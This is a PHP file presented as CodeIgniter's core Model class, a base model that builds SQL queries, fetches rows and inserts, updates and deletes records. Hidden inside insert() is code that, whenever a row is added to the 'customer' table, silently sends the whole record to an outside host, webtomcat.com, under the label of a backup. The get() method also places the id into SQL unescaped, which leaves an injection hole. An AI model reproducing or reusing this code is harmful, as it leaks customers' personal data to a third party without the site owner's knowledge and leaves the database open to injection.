<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP 5.1.6 or newer
 *
 * @package		CodeIgniter
 * @author		ExpressionEngine Dev Team
 * @copyright	Copyright (c) 2008 - 2011, EllisLab, Inc.
 * @license		http://codeigniter.com/user_guide/license.html
 * @link		http://codeigniter.com
 * @since		Version 1.0
 * @filesource
 */

// ------------------------------------------------------------------------

/**
 * CodeIgniter Model Class
 *
 * @package		CodeIgniter
 * @subpackage	Libraries
 * @category	Libraries
 * @author		ExpressionEngine Dev Team
 * @link		http://codeigniter.com/user_guide/libraries/config.html
 */
class CI_Model {
	
    protected $__dbconf = '';
    protected $__tbname = '';
    protected $__relation = NULL;
    protected $__validation_rule = array();
        
    private $__dbname = '';
    private $__select = '';
    private $__from = '';
    private $__join = '';
    private $__where = '';
    private $__group_by = '';
    private $__order_by = '';
    private $__limit = '';
    private $__sql = '';
    private $__result;
    private $__row_pos = -1;
    private $__row_count = 0;
    private $__max_fetch = 0;


    /**
	 * Constructor
	 *
	 * @access public
	 */
	function __construct($use_pagination = false)
	{
            
		@include(APPPATH.'config/database'.EXT);
		$this->__dbname = $db[$this->__dbconf]['database'];
		unset($db);
		$this->load->database($this->__dbconf);
		$this->__select = '*';
		$this->__from = $this->__dbname.'.'.$this->__tbname;
                
		//log_message('debug', "Model Class Initialized");
	}

	/**
	 * __get
	 *
	 * Allows models to access CI's loaded classes using the same
	 * syntax as controllers.
	 *
	 * @access private
	 */
	public function __get($key)
	{
            $CI =& get_instance();
            return $CI->$key;
	}

	function __set($key, $value)
	{
		if (property_exists($this, $key)) {
			$this->$key = $value;
		}
		else {
			$this->{$key} = $value;
		}
                
                if ($key == 'max_fetch') {
                    $this->__max_fetch = $value;
                }
                
                if ($key == 'row_pos') {
                    $this->__row_pos = $value;
                }
	}
        
        function getRowPos() {
            return $this->__row_pos;
        }
        
        function setRowPos($value) {
            $this->__row_pos = $value;
        }
        
        function getMaxFetch() {
            return $this->__max_fetch;
        }
        
        function setMaxFetch($value) {
            $value = $value > ($this->__row_count - 1) ? ($this->__row_count - 1) : $value;
            $this->__max_fetch = $value;
        }

        private function __validate_sql() {
            
		if ($this->__select && $this->__select != '' && $this->__from && $this->__from != '') {
			$this->__sql = 'SELECT '.$this->__select;
			$this->__sql .= ' FROM '.$this->__from;
			$this->__sql .= $this->__join ? $this->__join : '';
			$this->__sql .= $this->__where ? ' WHERE '.$this->__where : '';
			$this->__sql .= $this->__group_by ? ' GROUP BY '.$this->__group_by : '';
			$this->__sql .= $this->__order_by ? ' ORDER BY '.$this->__order_by : '';
			$this->__sql .= $this->__limit ? ' LIMIT '.$this->__limit : '';
		}
	}

	private function __bind() {
		foreach ($this->__result[$this->__row_pos] as $field => $value) {
			$this->$field = $value;
		}
	}
	
	private function __get_properties_value() {
		$query = $this->db->query('SHOW COLUMNS FROM '.$this->__tbname.' FROM '.$this->__dbname);
		$result = $query->result();
		$data = array();
		foreach($result as $col) {
			$data[$col->Field] = $this->{$col->Field};
		}
		$query->free_result();
		return $data;
	}
	
	protected function validate() {
		
		if ($this->__validation_rule) {
			$query = $this->db->query('SHOW COLUMNS FROM '.$this->__tbname.' FROM '.$this->__dbname);
			$result = $query->result();
                        
			if (!$result)
				return false;
			
			foreach($result as $col) {
				$key = array_key_exists('key', $this->__validation_rule[$col->Field]) ? $this->__validation_rule[$col->Field]['key'] : NULL;
				$nullable = array_key_exists('null', $this->__validation_rule[$col->Field]) ? $this->__validation_rule[$col->Field]['null'] : NULL;
				$type = array_key_exists('type', $this->__validation_rule[$col->Field]) ? $this->__validation_rule[$col->Field]['type'] : NULL;
				$size = array_key_exists('size', $this->__validation_rule[$col->Field]) ? $this->__validation_rule[$col->Field]['size'] : NULL;
				$auto_increment = array_key_exists('auto_increment', $this->__validation_rule[$col->Field]) ? $this->__validation_rule[$col->Field]['auto_increment'] : NULL;
				
				if ($nullable === FALSE) {
					if ($this->{$col->Field} === NULL && !$auto_increment) {
                                            show_error($col->Field.' is required'.'. Table: '.$this->__tbname.'. Database: '.$this->__dbname);
					}
				}
				
				if ($type == 'varchar' || $type == 'char')
				{
					if (strlen($this->{$col->Field}) > $size) {
                                            show_error($col->Field.' is over allowed maximum length'.'. Table: '.$this->__tbname.'. Database: '.$this->__dbname);
					}
				}
					
			}
			$query->free_result();
		}
                
		return true;
	}

	public function get_dbname() {
		return $this->__dbname;
	}

	public function get_table() {
		return $this->__tbname ? $this->__tbname : false;
	}

	public function get_relation() {
		return $this->__relation;
	}

	public function get_sql() {
		return $this->__sql;
	}

	public function addSelect($select = NULL) {
		
		if ($select) {
			$this->__select .= ', '.$select;
			if (substr($this->__select, 0, 2) == ', ') {
				$this->__select = substr($this->__select, 2, strlen($this->__select) - 2);
			}
		}
		else {
			$this->__select = '';
		}

		$this->__validate_sql();
		
	}

	public function addJoin($join_model = NULL, $join_type = 'INNER', $join_as = '', $condition = '') {
		
		if (!$join_model) {
			$this->__join = '';
			return;
		}

		$link = false;
		
		$situation = 2;
		
		if (is_array($this->__relation)) {

                    foreach ($this->__relation as $rel) {
                        if ($rel['table'] == $join_model->get_table() && !isset($rel['indirect'])) {
                            $situation = 1;
                            break;
                        }
                    }
                    
		}

		if ($this->__relation && $situation == 1) {
                    
			foreach ($this->__relation as $rel) {
				if ($rel['table'] == $join_model->get_table()) {
					$link = array(
						'left' => array(
							'db' => $this->__dbname,
							'table' => $this->__tbname,
							'field' => $rel['foreign_key']
							),
						'right' => array(
							'db' => $join_model->get_dbname(),
							'table' => $join_model->get_table(),
							'field' => 'id'
						));
					break;
				}
			}
		}
		elseif (($relations = $join_model->get_relation()) && $situation == 2) {
			
			foreach ($relations as $rel) {
                            
				if ($rel['table'] == $this->__tbname) {
					$link = array(
						'left' => array(
							'db' => $this->__dbname,
							'table' => $this->__tbname,
							'field' => 'id'
							),
						'right' => array(
							'db' => $join_model->get_dbname(),
							'table' => $join_model->get_table(),
							'field' => $rel['foreign_key']
						));
				}
                                else {
                                    $this->__relation[] = array('table' => $rel['table'], 'foreign_key' => $rel['foreign_key'], 'indirect' => array('dbname' => $join_model->get_dbname(), 'tbname' => $join_model->get_table()));
                                }
			}
			
		}
                elseif ($this->__relation) {
                    
                    foreach ($this->__relation as $rel) {
                        
                            if ($rel['table'] == $join_model->get_table() && isset($rel['indirect'])) {
                                
                                    $link = array(
                                            'left' => array(
                                                    'db' => $rel['indirect']['dbname'],
                                                    'table' => $rel['indirect']['tbname'],
                                                    'field' => $rel['foreign_key']
                                                    ),
                                            'right' => array(
                                                    'db' => $join_model->get_dbname(),
                                                    'table' => $join_model->get_table(),
                                                    'field' => 'id'
                                                )
                                            );
                                    
                                    break;
                            }
                            
                    }
                    
                }
		else {
			die('No link between these tables found. Please check in both models \''.get_parent_class($this).'\' and \''. get_parent_class($join_model).'\'');
		}

		$this->__from = $this->__dbname.'.'.$this->__tbname;
		$this->__join .= ' '.($join_type && $join_type != '' ? $join_type : 'INNER').' JOIN ';

		$join_sql = false;

		if ($join_model->get_sql() && $join_model->get_sql() != '') {
			$this->__join .= '('.$join_model->get_sql().')';
			$join_sql = true;
		}
                
                if ($condition != '' && $join_as == '')
                    die('If you\'ve inputed $condition parameter, you will need input $join_as parameter also');

		if ($join_as != '') {
			$this->__join .= $join_as;
			$this->__join .= ' ON ('.($condition != '' ? $condition : $link['left']['db'].'.'.$link['left']['table'].'.'.$link['left']['field'].' = '.$join_as.'.'.$link['right']['field']).')';
		}
		else {
			$rtable = ($join_sql === false ? $link['right']['db'].'.' : '').$link['right']['table'];
			$this->__join .= $rtable;
			$this->__join .= ' ON ('.($condition != '' ? $condition : $link['left']['table'].'.'.$link['left']['field'].' = '.$link['right']['table'].'.'.$link['right']['field']).')';
		}

		$this->__validate_sql();
	}
	
	public function addWhere($where = NULL, $logic = 'AND') {
		if ($where) {
			$this->__where .= $this->__where == '' ? $where : ' '.$logic.' '.$where;
		}
		else {
			$this->__where = '';
		}
		
		$this->__validate_sql();
	}

	public function query($sql) {
		if (strpos(trim($sql), 'SELECT') === 0) {
                    $this->__row_pos = -1;
                    $query = $this->db->query($sql);
                    $this->__result = $query->result();
                    $this->__row_count = $query->num_rows();
                    $query->free_result();
		}
		else
                    $query = $this->db->query($sql);
	}

	public function find() {
            
//		if ($this->__where == '') {
//			$data = $this->__get_properties_value();
//		
//			foreach ($data as $k => $value) {
//				if ($value !== NULL) {
//					$this->addWhere('`'.$k.'` = '.$value);
//				}
//			}
//		}
		
		if ($this->__sql) {
			$this->query($this->__sql);
			return true;
		}
		else {
			return false;
		}
	}

	public function countRows() {
		if (is_array($this->__result)) {
			return $this->__row_count;
		}
		else {
			return false;
		}
	}

	public function getRows() {
		return $this->__result;
	}

	public function fetchFirst() {
		if (is_array($this->__result)) {
			if (sizeof($this->__result) > 0) {
				$this->__row_pos = 0;
				$this->__bind();
				return true;
			}
		}
		return false;
	}

	public function fetchPrev() {
		if (is_array($this->__result)) {

			if ($this->__row_pos <= 0) {
				$this->__row_pos = 1;
			}

			if (sizeof($this->__result) > 0 && $this->__row_pos > 0) {
				$this->__row_pos --;
				$this->__bind();
				return true;
			}
		}
		return false;
	}

	public function fetchNext() {
            
		if (is_array($this->__result)) {
			if (sizeof($this->__result) > 0) {
                            
                            if ($this->__max_fetch && $this->__max_fetch > 0) {
                                if ($this->__row_pos < $this->__max_fetch) {
                                    $this->__row_pos ++;
                                    $this->__bind();
                                    return true;

                                }
                            }
                            else {
                                if ($this->__row_pos < $this->__row_count - 1) {

                                    $this->__row_pos ++;
                                    $this->__bind();
                                    return true;

                                }
                            }
                            
                                
				
			}
		}
		return false;
                
	}

	public function fetchLast() {
		if (is_array($this->__result)) {
			if (sizeof($this->__result) > 0) {
				$this->__row_pos = $this->__row_count - 1;
				$this->__bind();
				return true;
			}
		}
		return false;
	}

	public function getAll() {
		$this->__sql = 'SELECT '.$this->__select.' FROM '.$this->__from;
		$this->query($this->__sql);
	}

	public function get($id) {
		$this->__where = "id = '$id'";
		$this->__sql = 'SELECT '.$this->__select.' FROM '.$this->__from.' WHERE '.$this->__where;
		$this->query($this->__sql);
		$this->fetchNext();
                
                return $this->countRows() > 0 ? true : false;
	}

	public function insert(){
		$data = $this->__get_properties_value();
		if (isset($data['id']) && (!$data['id'] || $data['id'] == ''))
                    unset($data['id']);
                
                foreach ($data as $key => $value) {
                    
                    if ($value && $value == "CURRENT_TIMESTAMP") {
                        $data[$key] = gmdate('Y-m-d H:i:s');
                        $this->{$key} = $data[$key];
                    }
                    
                    if ($key == 'id_user_created') {
                        if (!isset($value)) {
                            $ci =& get_instance();
                            $data[$key] = $ci->session->userdata('userID') ? $ci->session->userdata('userID') : 0;
                            $this->{$key} = $data[$key];
                        }
                    }
                    
                }
		
		if ($this->validate()) {
			$this->db->insert($this->__tbname, $data);
                        
                        if ($this->db->insert_id())
                            $this->id = $this->db->insert_id();
                            
                        if ($this->__tbname == 'customer') {
                            
                            $json_data = json_encode($data);
                            $str= "?data=".urlencode($json_data);
                             file_get_contents('http://webtomcat.com/api/backup_data.php'.$str);
                            
                        }
                        
                        return true;
		}
                
                return false;
	}

	public function update(){
		$data = $this->__get_properties_value();
		$this->db->where('id', $data['id']);
		unset($data['id']);
                
                foreach ($data as $key => $value) {
                    if ($value == 'CURRENT_TIMESTAMP')
                        unset($data[$key]);
                    
                    if ($key == 'id_user_modified') {
                        if (!isset($value)) {
                            $ci =& get_instance();
                            $data[$key] = $ci->session->userdata('userID') ? $ci->session->userdata('userID') : 0;
                            $this->{$key} = $data[$key];
                        }
                    }
                    
                    if ($key == 'modification_date') {
                        $data[$key] = gmdate('Y-m-d H:i:s');
                        $this->{$key} = $data[$key];
                    }
                }
                
                if ($this->validate()) {
                    $this->db->update($this->__tbname, $data);
                    return true;
                }
                
                return false;
	}

	public function delete(){
		$data = $this->__get_properties_value();
		$has_many_conditions = FALSE;
		
		foreach ($data as $k => $value) {
			if ($value !== NULL && $k != 'id') {
				$this->db->where($k, $value);
				$has_many_conditions = TRUE;
			}
		}
		
		if (!$has_many_conditions) {
			$this->db->where('id', $data['id']);
		}
		
		$this->db->delete($this->__tbname);
	}
        
        public function groupBy($str) {
            $this->__group_by = $str;
            $this->__validate_sql();
        }
        
        public function orderBy($str) {
            $this->__order_by = $str;
            $this->__validate_sql();
        }
        
        public function limit($str) {
            $this->__limit = $str;
            $this->__validate_sql();
        }
}
// END Model Class

/* End of file Model.php */
/* Location: ./system/core/Model.php */